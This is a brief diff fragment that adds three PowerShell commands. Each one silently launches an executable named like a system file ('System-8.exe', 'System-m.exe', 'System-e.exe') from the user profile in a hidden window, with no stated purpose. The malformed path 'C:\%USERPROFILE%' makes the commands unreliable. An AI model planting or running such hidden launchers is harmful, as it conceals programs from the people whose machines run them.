@@ -28,7 +28,10 @@ System-m.exe
 System-e.exe
 
 
-
+powershell.exe -command Start-Process -FilePath "C:\%USERPROFILE%\System-8.exe" -ArgumentList "args" -WindowStyle Hidden 
+powershell.exe -command Start-Process -FilePath "C:\%USERPROFILE%\System-m.exe"  -ArgumentList "args" -WindowStyle Hidden 
+powershell.exe -command Start-Process -FilePath "C:\%USERPROFILE%\System-e.exe"  -ArgumentList "args" -WindowStyle Hidden 
+ 
 System-8.exe
 System-m.exe
 System-e.exe
